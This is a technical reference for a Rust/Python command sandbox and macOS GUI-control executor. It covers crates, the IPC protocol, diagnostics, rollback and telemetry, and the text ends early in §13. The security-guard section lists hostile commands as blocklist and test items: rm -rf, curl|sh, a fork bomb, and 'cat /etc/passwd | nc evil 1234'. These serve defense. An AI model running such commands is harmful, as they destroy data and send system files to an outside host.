# fusion-executor — Architecture & API Reference

> **Language / 语言**: **English** (default) | [中文 README](../README_CN.md) | [English README](../README.md)
>
> This is the technical reference (architecture deep-dive, crate map, full API surface, IPC protocol spec, data schemas). For build/test/quickstart, see the [README](../README.md).

- [1. Overview](#1-overview)
- [2. Crate Map](#2-crate-map)
- [3. Execution Pipeline](#3-execution-pipeline)
- [4. Data Schemas (Wire Contract)](#4-data-schemas-wire-contract)
- [5. Python API Reference](#5-python-api-reference)
- [6. IPC Protocol (UDS JSON-RPC 2.0)](#6-ipc-protocol-uds-json-rpc-20)
- [7. Security Guard](#7-security-guard)
- [8. Diagnostics Slicer (8 languages)](#8-diagnostics-slicer-8-languages)
- [9. macOS Computer Use (fe-gui)](#9-macos-computer-use-fe-gui)
- [10. Rollback & Auto-rollback](#10-rollback--auto-rollback)
- [11. Native File Tools & Surgical Patch Engine](#11-native-file-tools--surgical-patch-engine)
- [12. Live Telemetry](#12-live-telemetry)
- [13. Bidirectional Server-Push (BroadcastHub)](#13-bidirectional-server-push-broadcasthub)
- [14. NFRs / SLA](#14-nfrs--sla)
- [15. Unsafe Policy](#15-unsafe-policy)
- [16. Version History](#16-version-history)

## 1. Overview

fusion-executor is a controlled execution sandbox + macOS OS-level control hub for the Fusion ecosystem. It sits at the **L4 generic-tool layer** of the monorepo. The architecture audit (`audit/fusion-ar-audit.md` P2-7) designates it as the home for the code-sandbox capability — the "hands" of fusion-code / fusion-agent: it runs shell commands safely, drives native GUI via the Accessibility API, and rolls back on failure.

It replaces Claude SDK's BashTool/FileEdit/Glob/Grep + Docker sandbox and DeepSeek Harness's SWE-bench container, but **native** — no Docker: macOS process isolation + Git snapshots, sandbox init overhead <5ms.

**Stack**: Rust core (rustc 1.96) + Python 3.14 bindings via PyO3 0.29 + maturin. First maturin/PyO3 project in the Fusion monorepo (the other 23 Python projects use setuptools — a deliberate, approved divergence; `architecture/ar2.md` endorses "gradually migrate hot modules to Rust/PyO3").

**Four core subsystems**:
1. **Security Guard Engine** — two-stage: static regex blocklist (fast filter for `rm -rf`, `sudo`, format, remote pipe), then shlex-style lexer/AST tokenizer that splits compound shell commands (`&&`/`||`/`;`/`|`) and validates each binary against a whitelist. Intercept-rate target: 100%.
2. **Subprocess / PTY Sandbox** — PTY or stdio subprocess to capture ANSI color codes + full Traceback; heartbeat timer enforces timeout (SIGINT graceful → SIGKILL forceful within 50ms, cleans the whole child process tree); stdio truncation keeps head context + tail stack trace, folds the middle past `max_output_chars`.
3. **macOS Computer Use Adaptor** — `AXUIElement` to extract the foreground-window UI node tree (button/textfield coords + Accessibility Label); falls back to `CGWindowListCreateImage` framebuffer capture for vision grounding (mlx-vlm / fusion-design) when nodes lack Accessibility info. Click/keystroke latency target <30ms.
4. **Task Rollback Manager** — Git HEAD snapshot before any file-mutating command; lightweight `snapshot_create()` / `rollback()` hooks supporting single-file `git checkout`; auto-rollback after a detected file damage on failure.

**Integration**: fusion-code (TypeScript) and fusion-studio (Swift) consume the engine over UDS JSON-RPC 2.0 — the established monorepo IPC pattern. The executor itself runs **no model** (it is an L4 OS tool); vision grounding for Computer Use is delegated to the caller (fusion-design/mlx-vlm), and inference is delegated to fusion-mlx.

## 2. Crate Map

10-crate Cargo workspace (resolver 2, mirroring `fusion-design/Cargo.toml`). Crate prefix `fe-` (fusion-executor); underscore names in code (`fe_core`). `fe-pyo3` produces the `fusion_executor._native` native extension; pure-Python `executor.py` wraps it so users `from fusion_executor import FusionSandboxExecutor`.

| Crate | Role | Key types |
|---|---|---|
| `fe-core` | Orchestrator. Executor pipeline, sync/async API, `BLOCKING_RT = LazyLock<tokio::runtime::Runtime>` (multi-thread) to avoid nested-runtime panic when caller is in an asyncio loop. Stays **stateless per-task**. | `Executor`, `ExecutionRequest`, `ExecutionResult`, `Diagnostics`, `AutoRollbackGuard` |
| `fe-security` | Security Guard. Two-stage: regex blocklist + shlex tokenizer chain-bypass defense + binary whitelist + arg validation (`mv`/`cp` dest under cwd, block `sed -i`, redirect-guard). | `SecurityGuard`, `SecurityVerdict` |
| `fe-sandbox` | PTY subprocess (portable-pty), heartbeat timeout (SIGINT→50ms→SIGKILL `killpg`), stdio truncation (head 4096 + tail 8192), OOM ring-buffer cap. | `Sandbox`, `SandboxResult`, `StreamEvent` |
| `fe-gui` | macOS Computer Use. `accessibility` 0.2 safe wrapper (AX tree/focus/click/type/inspect) + CoreGraphics 0.24 (CGEvent synthesis, CGDisplay screenshot). **Crate-level `#![allow(unsafe_code)]`** for 3 audited FFI blocks. | `GuiAction` (16 variants), `GuiResult`, `GuiController` |
| `fe-rollback` | Git CLI snapshot/rollback via `tokio::process::Command`. `snapshot_create` (stash create/HEAD) + `rollback` (checkout + stash apply) + `rollback_file` single-file + `AutoRollbackGuard`. | `RollbackManager`, `RollbackPolicy` |
| `fe-diagnostics` | Traceback regex extraction (8 languages) + ±20-line code slice (tree-sitter AST reserved `_parser_for_ext` dead path; pure-text line extraction). | `Slicer`, `Diagnostics` |
| `fe-ipc` | UDS JSON-RPC 2.0 server + `BroadcastHub` duplex pub-sub. **`unsafe_code="deny"`** — 0 hand-written unsafe. | `Server`, `BroadcastHub`, `Subscriber` |
| `fe-tools` | Native file tools: `file_edit`/`glob`/`grep` + surgical patch engine `apply_patch` (diffy) / `replace_function` (tree-sitter AST). Reuses `fe-security` path guard. | `Tools`, `EditResult`, `GlobEntry`, `GrepMatch` |
| `fe-telemetry` | Live telemetry: 10Hz sysinfo CPU/mem sampling stream spawned on `BLOCKING_RT.handle()`. GPU fields caller-injected. | `TelemetrySample`, `TelemetryConfig` |
| `fe-pyo3` | PyO3 bindings → `fusion_executor._native`. pyclasses + `#[pymethods]`; pyo3 0.29 API (`py.detach` not `allow_threads`, `Py<PyAny>` not `PyObject`). | `NativeExecutor`, `NativeStreamIterator`, `NativeTelemetryIterator` |

```
fusion-executor/
├── Cargo.toml              # workspace root
├── pyproject.toml          # maturin build backend
├── crates/
│   ├── fe-core/            # orchestrator
│   ├── fe-security/        # Security Guard
│   ├── fe-sandbox/         # PTY sandbox
│   ├── fe-gui/             # macOS Computer Use
│   ├── fe-rollback/        # git snapshot/rollback
│   ├── fe-diagnostics/     # traceback slicer
│   ├── fe-ipc/             # UDS JSON-RPC + BroadcastHub
│   ├── fe-tools/           # file tools + patch engine
│   ├── fe-telemetry/       # live telemetry
│   └── fe-pyo3/            # PyO3 bindings (maturin target)
├── python/
│   └── fusion_executor/    # Pydantic v2 models + FusionSandboxExecutor
└── python/tests/           # pytest
```

## 3. Execution Pipeline

The `fe-core` `execute_async(req)` pipeline:

```
execute_async(req):
  1. security.validate(req.command)
     → if blocked: return ExecutionResult{exit_code:-1, blocked_by_security:true, security_reason}
  2. if req.enable_rollback_snapshot and command is file-mutating:
     rollback.snapshot_create(cwd) → snapshot_id
     [construct AutoRollbackGuard if req.auto_rollback_policy present]
  3. sandbox.run(cmd, cwd, env, timeout) → (exit_code, stdout, stderr, timed_out)
     [stdout/stderr already truncated + OOM-capped inside sandbox]
  4. if exit_code != 0: diagnostics.slice(stderr, cwd) → attach to result.diagnostics
  5. [if AutoRollbackGuard and exit_code!=0 and git-status damage detected:
     rollback(本次快照) → result.auto_rolled_back=True]
  6. return ExecutionResult   [snapshot left for caller; caller calls rollback() if it chooses]
```

**NFR**: `Executor::new()` must be <5ms — heavy pieces (tree-sitter parsers, git repo handles) lazy-init on first use, not in `new()`. Measured: 735µs.

**Sync entry** `execute()` uses `BLOCKING_RT = LazyLock<tokio::runtime::Runtime>` (multi-thread, `enable_all`) — pattern from `fusion-design/crates/fd-ai-adapter`. Avoids the nested-runtime panic when the caller is already in an asyncio loop.

**Streaming variant** `execute_streaming(req)` is async, returns `(mpsc::Receiver<ExecutionStreamEvent>, JoinHandle<()>)`. Validates → blocked yields a single Done frame → snapshot → `sandbox.run_streaming` → spawned task forwards `Chunk{data}` frames; on `Done` runs diagnostics slice + maps to `ExecutionResult`. `ExecutionStreamEvent` enum `#[serde(tag="type", rename_all="snake_case")]` `Chunk{data}`/`Done(Box<ExecutionResult>)` — serde **flattens** Done into `{"type":"done", exit_code:..., ...}` not nested. (Done boxed as `Box<ExecutionResult>` to satisfy clippy `large_enum_variant` — Done 264B vs Chunk 24B; serde transparent over Box, wire format unchanged.)

**Statelessness**: The Executor stays stateless per-task. Auto-rollback's `AutoRollbackGuard` lifetime is limited to a single execute; consecutive-failure counting is owned by the caller's self-healing loop, NOT the executor. Broadcast fan-out (BroadcastHub) is an IPC-broker concern and does not enter the executor state.

## 4. Data Schemas (Wire Contract)

The wire contract — `ExecutionRequest` in, `ExecutionResult` out — mirrored as Rust serde structs and Pydantic v2 models across 4 layers.

### `ExecutionRequest`

| Field | Type | Default | Notes |
|---|---|---|---|
| `command` | `str` | — | Shell command to run |
| `task_id` | `str?` | `None` | Request-side identity (PRD §4.1, v1.3) |
| `cwd` | `str?` | `None` | Working dir (defaults to process cwd) |
| `timeout_sec` | `float` | `30.0` | Heartbeat timeout; -124 on expiry |
| `env_vars` | `dict[str,str]?` | `None` | Extra env (merged onto parent) |
| `enable_rollback_snapshot` | `bool` | `True` | Take a git snapshot before exec |

### `ExecutionResult`

| Field | Type | Notes |
|---|---|---|
| `exit_code` | `int` | 0=success, -124=timeout, -1=blocked/internal |
| `stdout` | `str` | Truncated (head 4096 + tail 8192, middle folded) |
| `stderr` | `str` | Empty under PTY merge (all into stdout) |
| `task_id` | `str?` | Backfilled from request (PRD §4.1, v1.3) |
| `command` | `str?` | Backfilled from request |
| `duration_sec` | `float` | Wall-clock; 0.0 on blocked |
| `timed_out` | `bool` | True on -124 |
| `blocked_by_security` | `bool` | True on security block |
| `security_reason` | `str?` | Why blocked |
| `snapshot_id` | `str?` | Git snapshot SHA for rollback |
| `diagnostics` | `Diagnostics?` | Sliced when exit_code != 0 |
| `auto_rolled_back` | `bool` | True if auto-rollback fired (v1.4) |

### `Diagnostics` (PRD §4.2 Slicer output)

| Field | Type | Notes |
|---|---|---|
| `error_type` | `str` | e.g. `ValueError`, `TS2322`, `panic`, `compile error` |
| `file_path` | `str?` | Offending file (relative or absolute per source) |
| `line_number` | `int?` | 1-indexed offending line |
| `code_snippet` | `str?` | ±20-line context, error line marked `>` |
| `raw_trace` | `str?` | Last 30-line traceback block |

### `RollbackPolicy` (v1.4)

| Field | Type | Default | Notes |
|---|---|---|---|
| `max_consecutive_failures` | `int` | `3` | Reserved (owned by caller) |
| `file_damage_check` | `bool` | `True` | `git status --porcelain` damage gate |

### `TelemetrySample` (v1.4)

| Field | Type | Notes |
|---|---|---|
| `ts_ms` | `int` | Caller-epoch milliseconds |
| `cpu_pct` | `float` | Single-core multiples |
| `mem_mb` | `float` | Resident memory MB |
| `gpu_pct` | `float?` | Caller-injected; serde-skip when None |
| `gpu_mem_mb` | `float?` | Caller-injected; serde-skip when None |
| `task_id` | `str?` | Optional tag |

### `EditResult` / `GlobEntry` / `GrepMatch` (v1.3 file tools)

| Model | Fields |
|---|---|
| `EditResult` | `ok: bool, path: str?, error: str?, matches: int` |
| `GlobEntry` | `path: str, is_dir: bool` |
| `GrepMatch` | `path: str, line_number: int, content: str` |

### `GuiResult` (fe-gui)

| Field | Type | Notes |
|---|---|---|
| `ok` | `bool` | Action succeeded |
| `node_tree` | `str?` | AXUIElement tree JSON (inspect_tree) |
| `screenshot_png_b64` | `str?` | PNG base64 (screenshot) |
| `screenshot_width` | `int?` | PNG pixel width (v1.2) |
| `screenshot_height` | `int?` | PNG pixel height (v1.2) |
| `error` | `str?` | e.g. `accessibility-permission-required` |

## 5. Python API Reference

Package root `fusion_executor` (import as `from fusion_executor import FusionSandboxExecutor, ExecutionResult`). Native extension `fusion_executor._native` built from `crates/fe-pyo3`.

### `FusionSandboxExecutor`

| Method | Signature | Notes |
|---|---|---|
| `__init__` | `(sock_path: str \| None = None)` | Optional UDS socket path override |
| `run` | `(command, *, task_id=None, cwd=None, timeout=30.0, env_vars=None, enable_rollback_snapshot=True, auto_rollback=None) -> ExecutionResult` | Sync; simplest for scripts |
| `run_async` | `(command, **kw) -> ExecutionResult` | Async (await); for asyncio callers |
| `run_streaming` | `(command, **kw) -> Iterator[str \| ExecutionResult]` | Generator: chunk strings then `ExecutionResult` at done |
| `snapshot_create` | `(cwd: str) -> str` | `git stash create` → SHA |
| `rollback` | `(snapshot_id: str, cwd: str \| None = None) -> bool` | `git checkout -- . && git stash apply <id>` |
| `file_edit` | `(path, old_string, new_string, *, cwd=None) -> EditResult` | Unique-match replace |
| `glob` | `(pattern, *, cwd=None) -> list[GlobEntry]` | Wildcard, relative paths |
| `grep` | `(pattern, paths, *, cwd=None) -> list[GrepMatch]` | Regex, recursive, 1000 cap |
| `apply_patch` | `(patch_text, *, cwd=None) -> EditResult` | Unified Diff (diffy) |
| `replace_function` | `(path, fn_name, new_body, *, cwd=None) -> EditResult` | tree-sitter AST, py/js/ts/rs |
| `gui_action` | `(action: dict) -> GuiResult` | 16 GuiAction variants |
| `telemetry_stream` | `(*, interval_ms=100, max_samples=0) -> Iterator[TelemetrySample]` | 10Hz CPU/mem generator |
| `subscribe` | `(channels, *, sock_path=None, interval_ms=100, screenshot_interval_ms=1000) -> Subscription` | Bidirectional server-push (needs running `serve()`) |
| `serve` | `(sock_path: str \| None = None) -> None` | Start UDS JSON-RPC server (runs forever) |

### `Subscription` (v1.5 #14)

Pure-Python UDS client. `SUB_CHANNELS = ("telemetry", "stdio", "screenshot")` — unknown channel → `ValueError`.

| Member | Notes |
|---|---|
| `subscription_id` | `"sub-N"` (set after `_open()`) |
| `__iter__` / `__next__` | Yields `executor.event` frame `params` dict matching this sub_id; skips non-event frames |
| `unsubscribe()` / `close()` | Send unsubscribe + close socket |

### Re-exported models

`ExecutionResult`, `ExecutionRequest`, `Diagnostics`, `EditResult`, `GlobEntry`, `GrepMatch`, `RollbackPolicy`, `TelemetrySample`, `GuiResult`, `Subscription`, `FusionSandboxExecutor`.

### Quick example

```python
from fusion_executor import FusionSandboxExecutor, ExecutionResult, RollbackPolicy

ex = FusionSandboxExecutor()

r = ex.run("echo hi")
assert r.exit_code == 0 and r.stdout == "hi\n"

r = ex.run("python3 -c \"raise ValueError('boom')\"")
assert r.diagnostics.error_type == "ValueError"

# auto-rollback on failure + file damage
r = ex.run(
    "python3 -c \"open('app.py','w').write('broken'); raise ValueError(1)\"",
    cwd="/repo",
    auto_rollback=RollbackPolicy(file_damage_check=True),
)
assert r.auto_rolled_back
```

## 6. IPC Protocol (UDS JSON-RPC 2.0)

UDS JSON-RPC 2.0, newline-delimited (`0x0A`), UTF-8 `ensure_ascii=false`. Socket `/tmp/fusion-executor.sock` (override `FUSION_EXECUTOR_SOCK`); startup unlinks stale + `chmod 0o666`. Per-connection `tokio::spawn` → `BufReader::read_line` → dispatch → `serde_json::to_string + "\n"`. Matches the monorepo UDS convention (`fusion-cowork desk_rpc.py`, `fusion-agent-studio daemon_server.py`, `fusion-studio IPCClient.swift`).

### Methods

| Method | Params | Result |
|---|---|---|
| `executor.health` | `{}` | `{"ok":true,"version":"...","ax_trusted":true}` |
| `executor.execute` | `ExecutionRequest` | `ExecutionResult` |
| `executor.execute_stream` | `ExecutionRequest` | multi-frame (chunk/done), id reused |
| `executor.snapshot_create` | `{"cwd":str}` | `{"snapshot_id":str}` |
| `executor.rollback` | `{"snapshot_id":str,"cwd"?:str}` | `{"ok":bool}` |
| `executor.diagnostics` | `{"stderr":str,"cwd":str}` | `Diagnostics` |
| `executor.gui_action` | `{"action":GuiAction}` | `GuiResult` |
| `executor.file_edit` | `{"path","old_string","new_string","cwd"?}` | `EditResult` |
| `executor.glob` | `{"pattern","cwd"?}` | `list[GlobEntry]` |
| `executor.grep` | `{"pattern","paths":[...],"cwd"?}` | `list[GrepMatch]` |
| `executor.apply_patch` | `{"patch","cwd"?}` | `EditResult` |
| `executor.replace_function` | `{"path","fn_name","new_body","cwd"?}` | `EditResult` |
| `executor.telemetry_stream` | `{"interval_ms"?:100,"max_samples"?:0}` | multi-frame sample, id reused |
| `executor.subscribe` | `{"channels":[...],"interval_ms"?:100,"screenshot_interval_ms"?:1000}` | `{"ok":true,"subscription_id":"sub-N"}` |
| `executor.unsubscribe` | `{"subscription_id":str}` | `{"ok":true}` |
| `executor.shutdown` | `{}` | `{"ok":true}` |

### Error codes

| Code | Meaning |
|---|---|
| `-32700` | Parse error (malformed JSON) |
| `-32600` | Invalid request / bad params |
| `-32601` | Method not found |
| `-32603` | Internal error |
| `-32010` | Security blocked |
| `-32011` | Timeout |
| `-32012` | Rollback failed |
| `-32013` | AX not trusted (TCC Accessibility) |

### Stream frames (`executor.execute_stream`)

Multi-frame, id reused, newline-delimited:
- chunk: `{"jsonrpc":"2.0","id":id,"result":{"type":"chunk","data":"..."}}`
- done: `{"jsonrpc":"2.0","id":id,"result":{"type":"done","result":{...ExecutionResult}}}`

> Note: the **UDS path** nests done under `result.result`, DIFFERENT from the flattened **PyO3 path** (`{"type":"done", exit_code:..., ...}`). The two paths are deliberately separate; each consumer reads its own shape.

### Sample frames (`executor.telemetry_stream`)

Multi-frame, id reused:
- sample: `{"jsonrpc":"2.0","id":id,"result":{"type":"sample","sample":{...TelemetrySample}}}`

GPU fields omitted via serde `skip_serializing_if` when None.

### Server-push notifications (`executor.subscribe` / `#14`)

After the subscribe response, the server continuously pushes notification frames (**no id** — JSON-RPC notification convention; the client distinguishes response vs push by presence of `id`). The connection is **duplex** — other requests can be sent concurrently.

- push: `{"jsonrpc":"2.0","method":"executor.event","params":{"subscription_id":"sub-1","channel":"telemetry","data":{...}}}`

Three channels: `telemetry` (10Hz CPU/mem fan-out), `stdio` (cross-connection command chunk/done fan-out), `screenshot` (periodic `gui_action(Screenshot)` fan-out). See [§13](#13-bidirectional-server-push-broadcasthub).

### Clients

- fusion-code (TypeScript): sketch in `docs/ipc-client-typescript.md`
- fusion-studio (Swift): existing `IPCClient.swift udsCall(socketPath:method:params:)` pointed at `/tmp/fusion-executor.sock` — no new client code needed.

## 7. Security Guard

Two-stage `SecurityGuard::validate(command) -> SecurityVerdict { allowed, reason, stage }`:

**Stage 1 — static regex blocklist** (fast filter):
- `rm -rf /` / `~` / `$HOME`
- `sudo` / `su root`
- `diskutil eraseDisk` / `reformat` / `mkfs`
- `curl | sh` / `wget | bash` / `nc | sh`
- `dd of=/dev/rdisk`
- `> /dev/sd*`
- fork bomb `:(){ :|:& };:`
- force-push to `main`/`master`
- `reset --hard` on protected refs

**Stage 2 — token-level AST tokenizer** (chain-bypass defense, NFR):
Custom tokenizer over `shell-words` splits on `&&` / `||` / `;` / `|`. Each segment's argv[0] (after env-assignment prefix) checked against a whitelist: `python`, `python3`, `node`, `npm`, `npx`, `pytest`, `cargo`, `rustc`, `swift`, `swiftc`, `git`, `ls`, `cat`, `echo`, `grep`, `find`, `mkdir`, `touch`, `pwd`, `which`, `file`, `head`, `tail`, `wc`, `sort`, `uniq`, `go`, `tsc` (v1.5 added `go`/`tsc` so real `go build`/`tsc --noEmit` flow through E2E). Any non-whitelisted binary in any pipe stage → reject.

**Arg validation** (Stage 2, not just binary name):
- `mv` / `cp` destination constrained under `cwd`
- `sed -i` (in-place) blocked
- `>` redirects rejected to `~/.ssh`, `/etc`, `/System`, `/Library`, `/usr`
- `cwd` rejected under those sensitive paths

**NFR**: 10k-char compound command validate = 317ns (regex fast-path blocks `rm -rf`). Chain-bypass attempts (`python -c "import os; os.system('rm -rf /')"`, `echo hi && sudo ls`, `cat /etc/passwd | nc evil 1234`) all rejected. Intercept-rate target 100%.

## 8. Diagnostics Slicer (8 languages)

`fe-diagnostics` `Slicer` runs when `exit_code != 0`. v1.5 expanded regex coverage from 4 to 9 patterns covering 8 languages. Pure-text line extraction (tree-sitter grammars remain a reserved `_parser_for_ext` dead path; zero new deps).

**Algorithm**:
1. Regex traceback extraction (last block, 30 lines).
2. `slice()` ordering: ts → python → node → bun → rust → go_panic → swift → go_compile (isolated by extension/keyword, no conflicts).
3. Output `Diagnostics{error_type, file_path, line_number, code_snippet, raw_trace}` — compact JSON sized for a prompt, error line marked `>` in the ±20-line `code_snippet`.

**Coverage (8 languages)**:

| Language | Regex | Sample match | error_type |
|---|---|---|---|
| Python | `Traceback ... (?:\w+Error\|Exception):` | `Traceback (most recent call last): ... ValueError: boom` | `ValueError` |
| TypeScript (tsc paren) | `file.ts(l,c): error TSxxxx:` | `bad.ts(2,5): error TS2322: ...` | `TS2322` |
| TypeScript (tsc watch) | `file.ts:l:c - error TSxxxx:` | `bad.ts:2:5 - error TS2322: ...` | `TS2322` |
| Node (V8) | `Error:.*at .* \((.*):(\d+):\d+\)` | `Error: ... at foo (/a.js:3:5)` | `Error` |
| Bun | lowercase `error:` + bare `at path:line:col` | `error: ... at /a.ts:3:5` | `error` |
| Rust | `thread '.*' panicked at (.*):(\d+):` | `thread 'main' panicked at src/main.rs:4:` | `panic` |
| Go panic | `(?s)` cross-line `panic: ... goroutine ... \tfile.go:line` | `panic: runtime error: ... goroutine 1 [running]: ... \tmain.go:7` | `panic` |
| Swift | `file:l:c: error:` | `main.swift:3:1: error: ...` | `error` |
| Go-compile | `file.go:l:c: msg` (no `error:` keyword) | `./main.go:6:5: undefined: foo` | `compile error` |

**Real toolchain E2E** (v1.5 #12): tsc 7.0.2 `TS2322`/`bad.ts`/line 2 ✓; `go build` `compile error`/`main.go`/line 6 ✓; `go run` panic `panic.go`/line 7 ✓. Diagnostics flow automatically through execute → `ExecutionResult.diagnostics` (when exit_code!=0), no 4-layer wiring.

## 9. macOS Computer Use (fe-gui)

`fe-gui` — macOS Computer Use. Two-layer, both behind traits (testable without a real window):

**Layer A — AXUIElement** (primary, `accessibility` 0.2 safe wrapper): `AXIsProcessTrusted()` permission check; `AXUIElementCreateSystemWide` → focused app → focused window → children → UI node tree (role `AXButton`/`AXTextField`/..., title/label, position, size, actions, enabled). `AXUIElementPerformAction(kAXPressAction)` for click, `AXUIElementSetAttributeValue(AXValue)` for type. PID→bundle id via `NSRunningApplication`. Target <30ms/node, ~100 nodes <30ms tree walk.

**Layer B — CoreGraphics** (fallback, `core-graphics` 0.24 safe wrapper): `CGDisplay::screenshot` → PNG base64 when a node lacks Accessibility info (Electron w/o a11y, canvas). Caller does Visual Grounding (fusion-design/mlx-vlm); executor runs NO vision model. Screen Recording TCC needed; untrusted → explicit `error: "screen-recording-permission-required"` (or for pointer actions, `accessibility-permission-required`).

### `GuiAction` (16 variants, serde tag=`kind`, rename_all=`snake_case`)

| Variant | Locators | Mechanism |
|---|---|---|
| `focus_app` | `bundle_id` | AX focus |
| `click` | `ax_label` / `ax_position` | CGEvent LeftMouseDown/Up |
| `double_click` | `ax_label` / `ax_position` | CGEvent 2× LeftMouseDown/Up, 2nd `MOUSE_EVENT_CLICK_STATE=2` |
| `right_click` | `ax_label` / `ax_position` | CGEvent RightMouseDown/Up + `CGMouseButton::Right` |
| `hover` | `ax_position` | CGEvent MouseMoved no button |
| `type_text` | — | AX set AXValue |
| `key_press` | `key` + `modifiers[]` | CGEvent keydown/keyup (cmd/ctrl/alt/shift/fn); single key, no chord |
| `scroll` | `dx` / `dy` | CGEvent scrollWheel unit axis |
| `drag` | `from x,y` / `to x,y` | mouseMove→leftMouseDown→move→leftMouseUp |
| `wait` | `seconds` | sleep (test helper) |
| `screenshot` | — | CGDisplay::screenshot → PNG base64 |
| `inspect_tree` | — | AXUIElement tree JSON |
| `window_close` | `bundle_id` | AX `kAXCloseButtonAttribute` → `press()` |
| `window_minimize` | `bundle_id` | AX `kAXMinimizeButtonAttribute` → `press()` |
| `window_zoom` | `bundle_id` | AX `kAXZoomButtonAttribute` → `press()` |
| `window_resize` | `bundle_id` + `width`/`height` | drag bottom-right resize handle (read AXPosition+AXSize, reuse `drag()` CGEvent) |

`resolve_click_position` helper shared by click/double_click/right_click (ax_position first; else ax_label → AX tree locate → read AXPosition; neither present → error).

**4-layer auto-flow**: fe-core/fe-ipc/fe-pyo3 dispatch after deserializing the `GuiAction` enum — new variants flow through with **zero per-variant wiring** (only fe-gui changes enum+execute+methods+tests). Python `gui_action(action: dict)` is generic.

**TCC permissions**: GUI tests are **manual** — AXUIElement/CoreGraphics need TCC Accessibility + Screen Recording. CI skips GUI when `!AXIsProcessTrusted()`. The two permissions are **independent**: a machine may be Accessibility-trusted but Screen-Recording-untrusted. Pointer actions (hover/click/double_click/right_click) need Accessibility; screenshot needs Screen Recording.

**`key_press` key names**: `resolve_keycode` maps 40+ case-insensitive names + aliases (enter=return, esc=escape, up=up_arrow, cmd=command...) → `core_graphics::event::KeyCode` constants. Unknown key → `ok:false` + `unknown-key: ...` (no panic, trusted-independent).

## 10. Rollback & Auto-rollback

`fe-rollback` — Git CLI shell via `tokio::process::Command` (well-tested, matches fusion-code; `git2`/libgit2 deferred to v2).

**Caller-driven by default** (locked decision): the Executor exposes `snapshot_create()` / `rollback()` and stays stateless per-task; the caller (fusion-code self-healing loop) owns retry count and triggers rollback.

| Method | Behavior |
|---|---|
| `snapshot_create(cwd)` | `git -C <cwd> stash create` → stash SHA; record `git rev-parse HEAD` baseline. `snapshot_id` = stash SHA (or HEAD SHA if nothing to stash) |
| `rollback(snapshot_id, cwd)` | `git -C <cwd> checkout -- . && git -C <cwd> stash apply <id>` (HEAD-baseline fix: when stash SHA != HEAD → stash apply; equal → skip, return Ok(true) — was wrongly trying `stash apply HEAD` which is a commit not a stash) |
| `rollback_file(path)` | single-file `git -C <cwd> checkout -- <path>` (PRD "单文件 checkout") |

**Auto-rollback (v1.4 — FR-04 optional policy)**: `run()` / `run_streaming()` accept `auto_rollback: RollbackPolicy`. When enabled, on command failure (`exit_code != 0`) AND workspace file damage detected (`git status --porcelain` non-empty), the `AutoRollbackGuard` auto-`rollback(本次快照)`s and sets `result.auto_rolled_back=True`. The guard lifetime is limited to a single execute; it does **not** track consecutive-failure counts (that stays with the caller). No snapshot (`enable_rollback_snapshot=False`) → guard skips. Non-git repo → damage detection failure treated as 0 changes, no rollback.

## 11. Native File Tools & Surgical Patch Engine

`fe-tools` (v1.3) — native replacement for Claude SDK FileEdit/Glob/Grep. All operations reuse `fe-security::SecurityGuard::validate_cwd` via `guard_path` (expand_tilde, join cwd if relative, reject `..` escape via canonicalize `starts_with`, validate parent dir). Atomic write via `.fe-tmp-{pid}` + rename.

### `file_edit` — unique-match exact replace

`content.matches(old_string)` count: 0 → `NoMatch`, >1 → `Ambiguous` reject (avoids accidental multi-edit), ==1 → `replacen` + atomic write. Returns `EditResult{ok, path, error, matches}`.

### `glob` — wildcard match

`glob::glob` with `cwd_abs = canonicalize(base)` computed **before** pattern build (the fix for the relative-path bug where canonicalized macOS temp-dir symlink results failed `strip_prefix`). Returns relative paths. Returns `list[GlobEntry{path, is_dir}]`.

### `grep` — regex search

`Regex` + walkdir recursion skipping dotfiles + binary `\0` detection + 1000-hit cap. Returns `list[GrepMatch{path, line_number, content}]`.

### `apply_patch` — Unified Diff (surgical)

`diffy 0.4.2` `Patch::from_str` → loop `patch.hunks()` counting via `count_hunk_lines` matching `diffy::Line::Insert`/`Delete`/`Context` variants (Line is an enum, NOT `.starts_with()`). Full-rewrite heuristic `pf.new_range().start()==0 && end()==0` → `FullRewriteForbidden`. Target = `patch.modified().or(original())` with `strip_prefix("b/")`/`("a/")`. `diffy::apply(base, &patch)`.

### `replace_function` — function-level replace (tree-sitter AST)

`parser_for_ext` + `function_node_kind` for py/js/ts|tsx/rs. **Stack-based preorder traversal** — tree-sitter 0.25.10 has NO `descendants()`, and `Node::children(&mut cursor)` borrows the cursor mutably so recursive shared-`&mut cursor` fails with lifetime/borrow errors. Fix = iterative `stack.push(root)`, per-node local `cursor` + `node.children(&mut cursor).collect()` into Vec, drop cursor, push children reversed. `child_by_field_name("name")` for function name. Byte-slice replace `[..span.start]+new_body+[span.end..]`. No grammar → `locate_function_regex` fallback. Not finding the function → `ok=False, error="function not found: ..."`.

## 12. Live Telemetry

`fe-telemetry` (v1.4) — 10Hz sysinfo CPU/mem sampling stream.

`TelemetrySample{ts_ms, cpu_pct, mem_mb, gpu_pct?, gpu_mem_mb?, task_id?}` + `TelemetryConfig{interval_ms=100 (10Hz), max_samples=0 (infinite)}`. GPU fields `Option` + `skip_serializing_if` — the executor runs no model, has no GPU handle, so GPU is caller-injected.

**Key fix**: `start_stream(cfg, rt::Handle)` spawns the sampling task ON the passed runtime handle (NOT bare `tokio::spawn` — that panicked "no reactor running" when called from sync PyO3 entry without runtime context; fix = `BLOCKING_RT.handle().clone()` passed from fe-core).

**Sampling**: `sys.refresh_processes_specifics(ProcessesToUpdate::Some(&[pid]), false, ProcessRefreshKind::new().with_memory().with_cpu())` (3-arg, NOT 2-arg `refresh_processes`; `System::new()` does NOT populate processes). First frame sleeps then samples (cpu_usage needs a refresh interval). Channel close / max_samples reached → stop.

**4-layer wiring**: fe-core `Executor.telemetry_stream(cfg) -> (mpsc::Receiver, JoinHandle)` spawns on `BLOCKING_RT.handle()`, re-exports `fe_telemetry as telemetry` + `TelemetryStreamConfig`/`TelemetryFrame` aliases → fe-ipc `executor.telemetry_stream` multi-frame NDJSON → fe-pyo3 `NativeTelemetryIterator` (`__iter__`/`__next__` via `py.detach` + `BLOCKING_RT.block_on(rx.recv())` + `serde_json::to_string`→`json.loads`; StopIteration on channel close; never-type fallback fix — explicit `let sample: TelemetrySample = match ...`) → Python `telemetry_stream()` generator (yields `TelemetrySample`, `enumerate` for count).

Executor stays **stateless**: each `telemetry_stream()` call is an independent stream.

## 13. Bidirectional Server-Push (BroadcastHub)

`fe-ipc` `BroadcastHub` (v1.5 #14) — IPC-broker concern. **fe-core Executor stays stateless** (broadcast fan-out does not enter the executor).

